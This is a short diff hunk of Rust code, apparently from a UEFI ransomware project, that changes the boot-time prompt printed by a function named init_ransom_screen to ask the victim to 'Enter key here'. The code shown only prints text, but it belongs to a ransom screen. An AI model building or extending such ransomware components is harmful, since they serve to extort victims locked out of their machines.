@@ -49,7 +49,8 @@ fn init_ransom_screen(st: &mut SystemTable<Boot>) -> uefi::Result {
                 .unwrap();
         }
     }
-    st.stdout().write_str("\n> ").unwrap();
+
+    st.stdout().write_str("\n\nEnter key here\n> ").unwrap();
 
     Ok(())
 }
